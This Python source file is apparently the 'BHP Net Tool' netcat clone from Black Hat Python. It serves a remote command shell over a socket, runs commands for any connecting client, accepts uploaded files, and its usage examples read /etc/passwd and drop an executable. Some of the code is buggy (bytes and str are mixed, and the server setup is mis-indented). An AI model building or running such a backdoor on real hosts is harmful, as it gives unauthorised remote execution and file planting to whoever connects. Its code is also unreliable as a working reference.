import sys
import socket
import getopt
import threading
import subprocess

listen = False
command = False
upload = False
execute = ""
target = ""
upload_destination = ""
port = 0

def usage():
    print("BHP Net Tool")
    print("")
    print("usage: bhpnet.py -t target_host -p port")
    print("-l --listen   -listen on [host]:[port] for incoming connections")
    print("-e --execute=file_to_run   -execute the given file upon receving a connection")
    print("-c -- command              -initialize a command shell")
    print("-u --upload_destination    -upon receiving connection upload file and write to [destination]")
    print("")
    print("")
    print("Examples: ")
    print("bhpnet.py -t 192.168.1.4 -p 5555 -l -c")
    print("bhpnet.py -t 192.168.1.4 -p 5555 -l -u=c:\\target.exe")
    print("bhpnet.py -t 192.168.1.4 -p 5555 -l -e=\"cat /etc/passwd\"")
    print("echo 'ABCDEFGHI'|./bhpnet.py -t 192.168.1.x -p 135")
    sys.exit(0)

def client_sender(buffer):
    client=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    try:
        client.connect((target,port))
        if len(buffer):
            client.send(buffer.encode("utf-8"))
        while True:
            data = client.recv(65535)  
            response = data.decode("utf-8")
            print(response)
            buffer = input("")    
            buffer += "\n"                        
            client.send(buffer.encode("utf-8"))
    except:
        print("[*]Exception!Exiting.")
        client.close()

def run_command(command):
    command = command.rstrip()
    try:
        output=subprocess.getoutput(command)
    except:
        output=b'run_command failed!'
    return output

def client_handler(client_socket):
    global upload
    global execute
    global command
    if len(upload_destination):
        data=client_socket.recv(65535)
        try:
            file_descriptor=open(upload_destination,"wb")
            file_descriptor.write(data)
            file_descriptor.close()
            client_socket.send(("Successfully saved file to %s\r\n"% upload_destination).encode("utf-8"))
        except:
            client_socket.send(("Failed to save file to%s\r\n"% upload_destination).encode("utf-8"))
    if len(execute):
        output=run_command(execute)
        client_socket.send(output) #mark
    if command:
        while True:
            client_socket.send(b"<BHP:#>")
            cmd_buffer = ""
            while "\n" not in cmd_buffer:
                cmd_buffer+=client_socket.recv(65535).decode('utf-8')
                print(cmd_buffer)
                response = run_command(cmd_buffer)
                client_socket.send(response.encode("utf-8"))


def server_loop():
    global target
    global port
    if not len(target):
        target = '0.0.0.0'
        server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        server.bind((target,port))
        server.listen(5)
        while True:
            client_socket,addr = server.accept()
            client_thread = threading.Thread(target=client_handler,args=(client_socket,))
            client_thread.start()



def main():
    global listen
    global port
    global execute
    global command
    global upload_destination
    global target
    
    if not len(sys.argv[1:]):
        usage()
    try:
        opts,args = getopt.getopt(sys.argv[1:],"hlct:u:p:e:",["help","listen","command","target","upload","port","execute"])
    except getopt.GetoptError as err:
        print(str(err))
        usage()

    for o,a in opts:
        if o in ("-h","--help"):
            usage()
        elif o in ("-l","--listen"):
            listen = True
        elif o in ("-e","--execute"):
            execute = a
        elif o in ("-c","--commandshell"):
            command = True
        elif o in ("-u","--upload"):
            upload_destination = a
            print(upload_destination)
        elif o in ("-t","--target"):
            target = a
        elif o in ("-p","--port"):
            port = int(a)
        else:
            assert False,"Undefined Variable"

    if not listen and len(target) and port >0:
        buffer =input("Enter your cmd:")
        client_sender(buffer)
        print("cmd sent!%s"%buffer)
    if listen:
        server_loop()

if __name__=="__main__":
    main()

        
                                  
        
